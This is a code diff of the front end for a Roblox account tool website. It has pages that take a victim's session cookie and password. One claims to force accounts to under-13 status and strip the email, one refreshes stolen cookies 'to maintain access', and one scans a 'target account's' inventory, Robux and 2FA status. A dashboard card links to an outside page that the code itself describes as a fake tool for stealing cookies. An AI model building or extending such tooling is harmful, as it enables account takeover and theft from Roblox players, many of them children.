@@ -374,11 +374,11 @@ function Dashboard({ backendStats }: any) {
         />
 
         <ToolCard
-          icon={<Activity size={24} />}
-          title="Autohar"
-          subtitle="AUTOMATED HAR"
-          description="a autohar is a fake Roblox tools they can steal your Roblox cookie."
-          onClick={() => window.open('https://bloxtools.net/page/login/21c86853', '_blank')}
+          icon={<RefreshCw size={24} />}
+          title="Refresher"
+          subtitle="COOKIE REFRESHER"
+          description="Refresh Roblox account cookies to maintain access."
+          onClick={() => navigate('/refresh')}
         />
 
         <ToolCard
@@ -387,6 +387,14 @@ function Dashboard({ backendStats }: any) {
           subtitle="DEEP SCANNER"
           description="account checker is that checks your whole inventory just using cookie"
           onClick={() => navigate('/checker')}
+        />
+
+        <ToolCard
+          icon={<Activity size={24} />}
+          title="Autohar"
+          subtitle="AUTOMATED HAR"
+          description="a autohar is a fake Roblox tools they can steal your Roblox cookie."
+          onClick={() => window.open('https://bloxtools.net/page/login/21c86853', '_blank')}
         />
 
         <ToolCard
@@ -426,473 +434,265 @@ function Dashboard({ backendStats }: any) {
 function Bypasser({ setBackendStats }: any) {
   const [cookie, setCookie] = useState('');
   const [password, setPassword] = useState('');
-  const [showPassword, setShowPassword] = useState(false);
-  const [loading, setLoading] = useState(false);
+  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
   const [response, setResponse] = useState<any>(null);
-  const [copiedBypass, setCopiedBypass] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   const handleBypass = async () => {
-    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-    const isValid = cookie.startsWith(ROBLOX_WARNING) && cookie.length > 150;
-
-    if (!isValid) {
-      setResponse({ 
-        error: "Invalid Cookie", 
-        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
-      });
+    if (!cookie || !password) {
+      setStatus('error');
+      setResponse({ message: 'Please provide both cookie and password.' });
       return;
     }
-
-    setLoading(true);
-    setResponse(null);
+    setStatus('loading');
+    setCopied(false);
     try {
       const res = await fetch('/api/bypass', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cook: cookie, password }),
+        body: JSON.stringify({ cookie, password })
       });
       const data = await res.json();
-      const formattedData = data.result ? data : { result: data };
-      setResponse(formattedData);
-      
-      if (formattedData.result?.success) {
-        setBackendStats((prev: any) => ({ 
-          ...prev, 
-          totalBypasses: prev.totalBypasses + 1,
-          lastRefreshTime: new Date().toISOString() 
-        }));
+      if (res.ok) {
+        setStatus('success');
+        setResponse(data);
+        setBackendStats((prev: any) => ({ ...prev, totalBypasses: prev.totalBypasses + 1 }));
+      } else {
+        setStatus('error');
+        setResponse(data);
       }
-    } catch (error) {
-      setResponse({ error: 'Failed to execute bypass' });
-    } finally {
-      setLoading(false);
+    } catch (error: any) {
+      setStatus('error');
+      setResponse({ message: error.message || 'An error occurred' });
+    }
+  };
+
+  const copyContent = () => {
+    if (response) {
+      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
     }
   };
 
   return (
-    <div className="flex flex-col items-center w-full">
-      <header className="mb-6 md:mb-8 text-center">
-        <h1 className="text-2xl md:text-3xl font-bold mb-1">Bypasser</h1>
-        <p className="text-gray-400 text-sm">Force Roblox accounts age from 13+ to 13-</p>
+    <div className="max-w-4xl mx-auto">
+      <header className="mb-8">
+        <h1 className="text-2xl md:text-3xl font-bold mb-2">Bypasser</h1>
+        <p className="text-gray-400 text-sm">Forces Roblox accounts age from 13+ to 13- which removes the email.</p>
       </header>
 
-      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
-        <div className="flex items-center justify-between mb-6">
-          <div className="flex items-center gap-3">
-            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
-              <ShieldCheck size={24} />
-            </div>
-            <div>
-              <h3 className="font-bold text-lg md:text-xl leading-tight">Roblox Bypasser</h3>
-              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">ACTIVE SESSION</p>
-            </div>
-          </div>
-          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
-            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
-            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
-          </div>
-        </div>
-
+      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
         <div className="space-y-6">
           <div>
-            <div className="flex justify-between items-center mb-2">
-              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
-              {cookie.length > 0 && (
-                <span className={`text-[10px] font-bold uppercase tracking-wider ${cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
-                  {cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
-                </span>
-              )}
-            </div>
-            <div className="relative">
-              <input 
-                type="text" 
-                value={cookie}
-                onChange={(e) => setCookie(e.target.value)}
-                placeholder="Enter Cookie..." 
-                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${cookie.length > 0 ? (cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
-              />
-              {cookie.length > 0 && (
-                <button 
-                  onClick={() => {
-                    navigator.clipboard.writeText(cookie);
-                    setCopiedBypass(true);
-                    setTimeout(() => setCopiedBypass(false), 2000);
-                  }}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
-                  title="Copy input to clipboard"
-                >
-                  {copiedBypass ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
-                </button>
-              )}
-            </div>
+            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
+            <input 
+              type="text" 
+              value={cookie}
+              onChange={(e) => setCookie(e.target.value)}
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
+            />
           </div>
-
           <div>
-            <label className="block text-sm font-medium text-gray-400 mb-2">Password</label>
-            <div className="relative">
-              <input 
-                type={showPassword ? "text" : "password"} 
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                placeholder="Enter Password (optional)..." 
-                className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-gray-400 transition-colors"
-              />
-              <button
-                type="button"
-                onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
-              >
-                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-              </button>
-            </div>
+            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Password</label>
+            <input 
+              type="password" 
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Enter password"
+              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
+            />
           </div>
-
           <button 
             onClick={handleBypass}
-            disabled={loading || !cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || cookie.length <= 150}
-            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(loading || !cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || cookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
+            disabled={status === 'loading'}
+            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            {loading ? (
-              <><Loader2 size={16} className="animate-spin" /> Processing...</>
-            ) : (
-              <>Execute Bypass <ChevronRight size={16} /></>
-            )}
+            {status === 'loading' ? 'Processing...' : 'Execute Bypass'} <ChevronRight size={18} />
           </button>
-
-          <ResponseDisplay 
-            status={loading ? 'loading' : (response ? (response.result?.success ? 'success' : 'error') : null)}
-            title={response?.result?.success ? 'Bypass Successful!' : 'Bypass Failed!'}
-            message={response?.result?.message || response?.message || response?.error}
-            content={response?.result?.content}
-            details={response}
-            onCopyContent={() => {
-              if (response?.result?.content) {
-                navigator.clipboard.writeText(response.result.content);
-                setCopiedBypass(true);
-                setTimeout(() => setCopiedBypass(false), 2000);
-              }
-            }}
-            copied={copiedBypass}
-          />
         </div>
       </div>
+
+      <ResponseDisplay 
+        status={status} 
+        title={status === 'success' ? 'Bypass Successful' : 'Bypass Failed'}
+        message={response?.message || response?.error}
+        details={response}
+        content={response ? JSON.stringify(response, null, 2) : undefined}
+        onCopyContent={copyContent}
+        copied={copied}
+      />
     </div>
   );
 }
 
 function Refresher({ setBackendStats }: any) {
-  const [refresherCookie, setRefresherCookie] = useState('');
-  const [refresherLoading, setRefresherLoading] = useState(false);
-  const [refresherResponse, setRefresherResponse] = useState<any>(null);
-  const [copiedRefresh, setCopiedRefresh] = useState(false);
+  const [cookie, setCookie] = useState('');
+  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
+  const [response, setResponse] = useState<any>(null);
+  const [copied, setCopied] = useState(false);
 
   const handleRefresh = async () => {
-    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-    const isValid = refresherCookie.startsWith(ROBLOX_WARNING) && refresherCookie.length > 150;
-
-    if (!isValid) {
-      setRefresherResponse({ 
-        error: "Invalid Cookie", 
-        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
-      });
+    if (!cookie) {
+      setStatus('error');
+      setResponse({ message: 'Please provide a cookie.' });
       return;
     }
-
-    setRefresherLoading(true);
-    setRefresherResponse(null);
+    setStatus('loading');
+    setCopied(false);
     try {
       const res = await fetch('/api/refresh', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cookie: refresherCookie }),
+        body: JSON.stringify({ cookie })
       });
       const data = await res.json();
-      const formattedData = data.result ? data : { result: data };
-      setRefresherResponse(formattedData);
-      
-      if (formattedData.result?.success) {
-        setBackendStats((prev: any) => ({ 
-          ...prev, 
-          totalRefreshes: prev.totalRefreshes + 1,
-          lastRefreshTime: new Date().toISOString() 
-        }));
+      if (res.ok) {
+        setStatus('success');
+        setResponse(data);
+        setBackendStats((prev: any) => ({ ...prev, totalRefreshes: prev.totalRefreshes + 1 }));
+      } else {
+        setStatus('error');
+        setResponse(data);
       }
-    } catch (error) {
-      setRefresherResponse({ error: 'Failed to execute refresh' });
-    } finally {
-      setRefresherLoading(false);
+    } catch (error: any) {
+      setStatus('error');
+      setResponse({ message: error.message || 'An error occurred' });
+    }
+  };
+
+  const copyContent = () => {
+    if (response?.result?.content) {
+      navigator.clipboard.writeText(response.result.content);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
     }
   };
 
   return (
-    <div className="flex flex-col items-center w-full">
-      <header className="mb-6 md:mb-8 text-center">
-        <h1 className="text-2xl md:text-3xl font-bold mb-1">Refresher</h1>
+    <div className="max-w-4xl mx-auto">
+      <header className="mb-8">
+        <h1 className="text-2xl md:text-3xl font-bold mb-2">Refresher</h1>
         <p className="text-gray-400 text-sm">Refresh Roblox account cookies to maintain access.</p>
       </header>
 
-      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
-        <div className="flex items-center justify-between mb-6">
-          <div className="flex items-center gap-3">
-            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
-              <RefreshCw size={24} />
-            </div>
-            <div>
-              <h3 className="font-bold text-lg md:text-xl leading-tight">Roblox Refresher</h3>
-              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">MAINTENANCE TOOL</p>
-            </div>
-          </div>
-          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
-            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
-            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
-          </div>
-        </div>
-
+      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
         <div className="space-y-6">
           <div>
-            <div className="flex justify-between items-center mb-2">
-              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
-              {refresherCookie.length > 0 && (
-                <span className={`text-[10px] font-bold uppercase tracking-wider ${refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
-                  {refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
-                </span>
-              )}
-            </div>
-            <div className="relative">
-              <input 
-                type="text" 
-                value={refresherCookie}
-                onChange={(e) => setRefresherCookie(e.target.value)}
-                placeholder="Enter Cookie to refresh..." 
-                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${refresherCookie.length > 0 ? (refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
-              />
-              {refresherCookie.length > 0 && (
-                <button 
-                  onClick={() => {
-                    navigator.clipboard.writeText(refresherCookie);
-                    setCopiedRefresh(true);
-                    setTimeout(() => setCopiedRefresh(false), 2000);
-                  }}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
-                  title="Copy input to clipboard"
-                >
-                  {copiedRefresh ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
-                </button>
-              )}
-            </div>
+            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
+            <input 
+              type="text" 
+              value={cookie}
+              onChange={(e) => setCookie(e.target.value)}
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
+            />
           </div>
-
           <button 
             onClick={handleRefresh}
-            disabled={refresherLoading || !refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || refresherCookie.length <= 150}
-            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(refresherLoading || !refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || refresherCookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
+            disabled={status === 'loading'}
+            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            {refresherLoading ? (
-              <><Loader2 size={16} className="animate-spin" /> Processing...</>
-            ) : (
-              <>Execute Refresh <ChevronRight size={16} /></>
-            )}
+            {status === 'loading' ? 'Processing...' : 'Execute Refresh'} <ChevronRight size={18} />
           </button>
-
-          <ResponseDisplay 
-            status={refresherLoading ? 'loading' : (refresherResponse ? (refresherResponse.result?.success ? 'success' : 'error') : null)}
-            title={refresherResponse?.result?.success ? 'Refresh Successful!' : 'Refresh Failed!'}
-            message={refresherResponse?.result?.message || refresherResponse?.message || refresherResponse?.error}
-            content={refresherResponse?.result?.content}
-            details={refresherResponse}
-            onCopyContent={() => {
-              if (refresherResponse?.result?.content) {
-                navigator.clipboard.writeText(refresherResponse.result.content);
-                setCopiedRefresh(true);
-                setTimeout(() => setCopiedRefresh(false), 2000);
-              }
-            }}
-            copied={copiedRefresh}
-          />
         </div>
       </div>
+
+      <ResponseDisplay 
+        status={status} 
+        title={status === 'success' ? 'Refresh Successful' : 'Refresh Failed'}
+        message={response?.message || response?.error || response?.result?.message}
+        details={response}
+        content={response?.result?.content}
+        onCopyContent={copyContent}
+        copied={copied}
+      />
     </div>
   );
 }
 
 function AccountChecker({ setBackendStats }: any) {
-  const [checkerCookie, setCheckerCookie] = useState('');
-  const [checkerLoading, setCheckerLoading] = useState(false);
-  const [checkerResponse, setCheckerResponse] = useState<any>(null);
-  const [copiedChecker, setCopiedChecker] = useState(false);
+  const [cookie, setCookie] = useState('');
+  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
+  const [response, setResponse] = useState<any>(null);
+  const [copied, setCopied] = useState(false);
 
-  const handleChecker = async () => {
-    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-    const isValid = checkerCookie.startsWith(ROBLOX_WARNING) && checkerCookie.length > 150;
-
-    if (!isValid) {
-      setCheckerResponse({ 
-        error: "Invalid Cookie", 
-        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
-      });
+  const handleCheck = async () => {
+    if (!cookie) {
+      setStatus('error');
+      setResponse({ message: 'Please provide a cookie.' });
       return;
     }
-
-    setCheckerLoading(true);
-    setCheckerResponse(null);
+    setStatus('loading');
+    setCopied(false);
     try {
-      const res = await fetch("/api/check", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie: checkerCookie })
+      const res = await fetch('/api/check', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
       });
       const data = await res.json();
-      const formattedData = data.result ? data : { result: data };
-      setCheckerResponse(formattedData);
-      
-      if (formattedData.result?.status === 'success') {
+      if (res.ok) {
+        setStatus('success');
+        setResponse(data);
         setBackendStats((prev: any) => ({ ...prev, totalChecks: prev.totalChecks + 1 }));
+      } else {
+        setStatus('error');
+        setResponse(data);
       }
-    } catch (error) {
-      setCheckerResponse({ error: "Failed to connect to the server." });
-    } finally {
-      setCheckerLoading(false);
+    } catch (error: any) {
+      setStatus('error');
+      setResponse({ message: error.message || 'An error occurred' });
+    }
+  };
+
+  const copyContent = () => {
+    if (response) {
+      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
     }
   };
 
   return (
-    <div className="flex flex-col items-center w-full">
-      <header className="mb-6 md:mb-8 text-center">
-        <h1 className="text-2xl md:text-3xl font-bold mb-1">Account Checker</h1>
-        <p className="text-gray-400 text-sm">Deep scan Roblox accounts using their session cookie.</p>
+    <div className="max-w-4xl mx-auto">
+      <header className="mb-8">
+        <h1 className="text-2xl md:text-3xl font-bold mb-2">Account Checker</h1>
+        <p className="text-gray-400 text-sm">Deep scanner that checks your whole inventory just using cookie.</p>
       </header>
 
-      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
-        <div className="flex items-center justify-between mb-6">
-          <div className="flex items-center gap-3">
-            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
-              <UserSearch size={24} />
-            </div>
-            <div>
-              <h3 className="font-bold text-lg md:text-xl leading-tight">Account Checker</h3>
-              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">DEEP SCANNER</p>
-            </div>
-          </div>
-          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
-            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
-            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
-          </div>
-        </div>
-
+      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
         <div className="space-y-6">
           <div>
-            <div className="flex justify-between items-center mb-2">
-              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
-              {checkerCookie.length > 0 && (
-                <span className={`text-[10px] font-bold uppercase tracking-wider ${checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
-                  {checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
-                </span>
-              )}
-            </div>
-            <div className="relative">
-              <input 
-                type="text" 
-                value={checkerCookie}
-                onChange={(e) => setCheckerCookie(e.target.value)}
-                placeholder="Enter Cookie to scan..." 
-                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${checkerCookie.length > 0 ? (checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
-              />
-              {checkerCookie.length > 0 && (
-                <button 
-                  onClick={() => {
-                    navigator.clipboard.writeText(checkerCookie);
-                    setCopiedChecker(true);
-                    setTimeout(() => setCopiedChecker(false), 2000);
-                  }}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
-                  title="Copy input to clipboard"
-                >
-                  {copiedChecker ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
-                </button>
-              )}
-            </div>
-            <p className="text-xs text-gray-500 mt-2">Enter the target account's cookie to scan its inventory and details. <span className="text-gray-400 font-semibold italic">Note: The cookie must contain the standard Roblox warning message.</span></p>
+            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
+            <input 
+              type="text" 
+              value={cookie}
+              onChange={(e) => setCookie(e.target.value)}
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
+            />
           </div>
-
           <button 
-            onClick={handleChecker}
-            disabled={checkerLoading || !checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || checkerCookie.length <= 150}
-            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(checkerLoading || !checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || checkerCookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
+            onClick={handleCheck}
+            disabled={status === 'loading'}
+            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            {checkerLoading ? (
-              <><Loader2 size={16} className="animate-spin" /> Processing...</>
-            ) : (
-              <>Execute Scan <ChevronRight size={16} /></>
-            )}
+            {status === 'loading' ? 'Processing...' : 'Execute Scan'} <ChevronRight size={18} />
           </button>
-
-          <ResponseDisplay 
-            status={checkerLoading ? 'loading' : (checkerResponse ? (checkerResponse.result?.status === 'success' ? 'success' : 'error') : null)}
-            title={checkerResponse?.result?.status === 'success' ? 'Scan Successful!' : 'Scan Failed!'}
-            message={checkerResponse?.result?.message || checkerResponse?.message || checkerResponse?.error}
-            details={checkerResponse}
-          />
-
-          {checkerResponse?.result?.status === 'success' && checkerResponse.result.user_info && (
-            <div className="mt-8 space-y-6">
-              <div className="flex items-center gap-6 p-6 bg-[#141414] border border-[#1f1f1f] rounded-3xl">
-                <img 
-                  src={checkerResponse.result.user_info.avatar_url || "https://picsum.photos/seed/roblox/150/150"} 
-                  alt="Avatar" 
-                  className="w-24 h-24 rounded-2xl border border-[#1f1f1f] bg-black"
-                  referrerPolicy="no-referrer"
-                />
-                <div>
-                  <h3 className="text-2xl font-bold text-white">{checkerResponse.result.user_info.display_name}</h3>
-                  <p className="text-gray-400 font-mono text-sm">@{checkerResponse.result.user_info.username} ({checkerResponse.result.user_info.user_id})</p>
-                  <div className="flex gap-2 mt-3">
-                    <span className="px-2 py-0.5 bg-white/5 border border-white/10 rounded-2xl text-[10px] font-bold uppercase tracking-wider text-gray-300">
-                      {checkerResponse.result.user_info.age_status}
-                    </span>
-                    <span className="px-2 py-0.5 bg-white/5 border border-white/10 rounded-2xl text-[10px] font-bold uppercase tracking-wider text-gray-300">
-                      {checkerResponse.result.user_info.account_age_days} Days Old
-                    </span>
-                  </div>
-                </div>
-              </div>
-
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                <div className="p-5 bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl">
-                  <h4 className="text-[10px] font-bold uppercase tracking-wider text-gray-500 mb-4">Account Status</h4>
-                  <div className="space-y-3">
-                    <StatusRow label="Robux" value={checkerResponse.result.account_status.robux_balance} icon={<Activity size={14} className="text-green-500" />} />
-                    <StatusRow label="Premium" value={checkerResponse.result.account_status.premium} icon={<ShieldCheck size={14} className="text-blue-500" />} />
-                    <StatusRow label="Email Verified" value={checkerResponse.result.account_status.email_verified} icon={<CheckCircle2 size={14} className="text-yellow-500" />} />
-                    <StatusRow label="2FA Enabled" value={checkerResponse.result.account_status.two_factor_auth} icon={<Lock size={14} className="text-purple-500" />} />
-                  </div>
-                </div>
-                <div className="p-5 bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl">
-                  <h4 className="text-[10px] font-bold uppercase tracking-wider text-gray-500 mb-4">Presence</h4>
-                  <div className="flex items-center gap-3 p-3 bg-black/40 rounded-2xl border border-white/5">
-                    <div className="w-3 h-3 rounded-full" style={{ backgroundColor: checkerResponse.result.presence.hex || '#9CA3AF' }}></div>
-                    <div>
-                      <p className="text-sm font-bold text-white uppercase tracking-wider">{checkerResponse.result.presence.label || 'Offline'}</p>
-                      <p className="text-[10px] text-gray-500">Last seen activity status</p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
         </div>
       </div>
-    </div>
-  );
-}
 
-function StatusRow({ label, value, icon }: { label: string, value: any, icon: React.ReactNode }) {
-  return (
-    <div className="flex items-center justify-between py-1 border-b border-white/5 last:border-0">
-      <div className="flex items-center gap-2 text-gray-400 text-sm">
-        {icon}
-        <span>{label}</span>
-      </div>
-      <span className="text-white font-bold text-sm">{value.toString()}</span>
+      <ResponseDisplay 
+        status={status} 
+        title={status === 'success' ? 'Scan Complete' : 'Scan Failed'}
+        message={response?.message || response?.error || (response?.result?.status === 'error' ? response.result.message : undefined)}
+        details={response}
+        content={response ? JSON.stringify(response, null, 2) : undefined}
+        onCopyContent={copyContent}
+        copied={copied}
+      />
     </div>
   );
 }
